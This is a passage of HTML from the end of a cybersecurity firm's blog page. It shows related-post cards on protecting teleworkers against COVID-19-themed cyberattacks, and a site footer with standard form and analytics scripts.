				<div class="blog-related-content__container flex-row flex-row--space flex-row--wrap">
				    				       				       <div class="blog-related-content__post blog-post__card--category">
							<div class="blog-post__card-image-container">
								<a class="blog-post__card-image-link" href="https://ackcent.com/protect-against-cyberattacks-while-teleworking-amid-the-covid-19-outbreak/"><img width="960" height="659" src="https://ackcent.com/wp-content/uploads/2020/03/cybersecurity-coronavirus.jpg" class="attachment-full size-full wp-post-image" alt="Protect against cyberattacks while teleworking amid the COVID-19 outbreak" loading="lazy" srcset="https://ackcent.com/wp-content/uploads/2020/03/cybersecurity-coronavirus.jpg 960w, https://ackcent.com/wp-content/uploads/2020/03/cybersecurity-coronavirus-300x206.jpg 300w, https://ackcent.com/wp-content/uploads/2020/03/cybersecurity-coronavirus-768x527.jpg 768w" sizes="(max-width: 960px) 100vw, 960px"/></a>
							</div>
							<div class="blog-post__card-info">
								<ul class="blog-post__card-categories">
									<li class="blog-post__card-category"><a class="blog-post__card-category-link label-tag" href="awareness">Awareness</a></li><li class="blog-post__card-category"><a class="blog-post__card-category-link label-tag" href="cybersecurity">Cybersecurity</a></li>								</ul>
								<h3 class="blog-post__card-title"><a class="blog-post__card-title-link" href="https://ackcent.com/protect-against-cyberattacks-while-teleworking-amid-the-covid-19-outbreak/">Protect against cyberattacks while teleworking amid the COVID-19 outbreak</a></h3> 
			                    <p class="blog-post__card-excerpt">As fear over the spread of COVID-19 is surging at an alarming rate, public health institutions recommend companies to take a stance in preventing the virus from spreading around offices, public transports or public gatherings.</p>
			                    <div class="blog-post__card-post-meta">
									<span class="blog-post__card-date">March 12, 2020</span>
																			<span class="blog-post__card-author-name">By <a href="https://ackcent.com/author/ackcent/" title="Posts by Ackcent Cybersecurity" class="author url fn" rel="author">Ackcent Cybersecurity</a></span>
																	</div>
							</div>
						</div>
				    				       				       <div class="blog-related-content__post blog-post__card--category">
							<div class="blog-post__card-image-container">
								<a class="blog-post__card-image-link" href="https://ackcent.com/protect-yourself-against-covid-19-themed-cyberattacks/"><img width="2560" height="1707" src="https://ackcent.com/wp-content/uploads/2020/03/covid-19-themed-attacks-scaled.jpg" class="attachment-full size-full wp-post-image" alt="Protect yourself against COVID-19-themed cyberattacks" loading="lazy" srcset="https://ackcent.com/wp-content/uploads/2020/03/covid-19-themed-attacks-scaled.jpg 2560w, https://ackcent.com/wp-content/uploads/2020/03/covid-19-themed-attacks-300x200.jpg 300w" sizes="(max-width: 2560px) 100vw, 2560px"/></a>
							</div>
							<div class="blog-post__card-info">
								<ul class="blog-post__card-categories">
									<li class="blog-post__card-category"><a class="blog-post__card-category-link label-tag" href="awareness">Awareness</a></li><li class="blog-post__card-category"><a class="blog-post__card-category-link label-tag" href="cybersecurity">Cybersecurity</a></li>								</ul>
								<h3 class="blog-post__card-title"><a class="blog-post__card-title-link" href="https://ackcent.com/protect-yourself-against-covid-19-themed-cyberattacks/">Protect yourself against COVID-19-themed cyberattacks</a></h3> 
			                    <p class="blog-post__card-excerpt">The outbreak of the Coronavirus is affecting people, organizations and nations around the globe. In an environment where people are hungry for information, attackers are taking advantage to spread malware.</p>
			                    <div class="blog-post__card-post-meta">
									<span class="blog-post__card-date">March 19, 2020</span>
																			<span class="blog-post__card-author-name">By <a href="https://ackcent.com/author/ackcent/" title="Posts by Ackcent Cybersecurity" class="author url fn" rel="author">Ackcent Cybersecurity</a></span>
																	</div>
							</div>
						</div>
				    				       				       <div class="blog-related-content__post blog-post__card--category">
							<div class="blog-post__card-image-container">
								<a class="blog-post__card-image-link" href="https://ackcent.com/building-a-safe-teleworking-environment/"><img width="2560" height="1707" src="https://ackcent.com/wp-content/uploads/2020/03/telework-protection-scaled.jpg" class="attachment-full size-full wp-post-image" alt="Building a safe teleworking environment" loading="lazy" srcset="https://ackcent.com/wp-content/uploads/2020/03/telework-protection-scaled.jpg 2560w, https://ackcent.com/wp-content/uploads/2020/03/telework-protection-300x200.jpg 300w" sizes="(max-width: 2560px) 100vw, 2560px"/></a>
							</div>
							<div class="blog-post__card-info">
								<ul class="blog-post__card-categories">
									<li class="blog-post__card-category"><a class="blog-post__card-category-link label-tag" href="awareness">Awareness</a></li><li class="blog-post__card-category"><a class="blog-post__card-category-link label-tag" href="cybersecurity">Cybersecurity</a></li><li class="blog-post__card-category"><a class="blog-post__card-category-link label-tag" href="soc">SOC</a></li>								</ul>
								<h3 class="blog-post__card-title"><a class="blog-post__card-title-link" href="https://ackcent.com/building-a-safe-teleworking-environment/">Building a safe teleworking environment</a></h3> 
			                    <p class="blog-post__card-excerpt">In this period, organizations face immense challenges in terms of business continuity. But it is also a great opportunity to build the perfect remote environment. </p>
			                    <div class="blog-post__card-post-meta">
									<span class="blog-post__card-date">March 30, 2020</span>
																			<span class="blog-post__card-author-name">By <a href="https://ackcent.com/author/ackcent/" title="Posts by Ackcent Cybersecurity" class="author url fn" rel="author">Ackcent Cybersecurity</a></span>
																	</div>
							</div>
						</div>
				    				    		   		</div>
		    </div>
			</div>
</section>
<footer class="footer">
	<div class="footer__container">
		<div class="container flex-row flex-row--space flex-row--wrap">
			<div class="footer__logo-container"><img src="https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg" alt="" class="footer__logo"></div>
			<div class="footer__menu">
				<div class="footer__menu-container">
					<ul id="menu-footer-menu" class="footer-menu menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-161"><a href="#">Company</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-750"><a href="https://ackcent.com/about-us/">About Us</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-360"><a href="https://ackcent.com/certifications/">Certifications</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-358"><a href="https://ackcent.com/partnerships/">Partners</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-359"><a href="https://ackcent.com/careers/">Careers</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-166"><a href="#">Resources</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1699"><a href="https://ackcent.com/blog/">Blog</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-170"><a href="#">Get in touch</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-749"><a href="https://ackcent.com/contact-us/">Contact us</a></li>
</ul>
</li>
</ul>				</div>
				<div class="footer__subscribe">
					<p class="footer__subscribe-title"></p>
					<div class="footer__subscribe-form subscribe-form"><p><!--[if lte IE 8]>
<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
<![endif]--><br/>
<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2.js"></script><br/>
<script>hbspt.forms.create({portalId:"6667213",formId:"7feda929-523d-4174-a176-09f4ee2d5e87"});</script></p>
</div>
				</div>
			</div>
			<div class="footer__offices">
								<div class="sm-icons sm-icons--footer">
											<a href="https://www.linkedin.com/company/ackcent/" target="_blank" class="sm-icon sm-icon--lk"></a>
																<a href="https://twitter.com/ackcentsecurity" target="_blank" class="sm-icon sm-icon--tw"></a>
																<a href="https://www.youtube.com/channel/UCPveBKMw91TmM_KbBAZAXZg/about" target="_blank" class="sm-icon sm-icon--yt"></a>
																<a href="https://medium.com/@ackcent" target="_blank" class="sm-icon sm-icon--md"></a>
														</div>
			</div>
		</div>
	</div>
	<div class="footer__legal container flex-row flex-row--space flex-row--wrap flex-row--vcenter">
		<div class="footer__legal-text flex-row flex-row--vcenter flex-row--wrap">
			<p>© Ackcent 2021. All rights reserved. <a href="/privacy-policy/">Privacy Policy</a></p>
			<ul id="menu-legal-menu" class="legal-menu menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2804"><a href="https://ackcent.com/cookie-policy/">Cookie Policy</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2791"><a href="https://ackcent.com/terms-of-use/">Terms of Use</a></li>
</ul>		</div>
	</div>
</footer>
<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' id='jquery-js'></script>
<script type='text/javascript' id='leadin-script-loader-js-js-extra'>//<![CDATA[
var leadin_wordpress={"userRole":"visitor","pageType":"post","leadinPluginVersion":"7.50.12"};
//]]></script>
<script type='text/javascript' src='https://js.hs-scripts.com/6667213.js?integration=WordPress' async defer id='hs-script-loader'></script>
<script type='text/javascript' src='https://ackcent.com/wp-content/themes/ackcent/js/theme.js' id='theme-js'></script>
</body>
</html> 
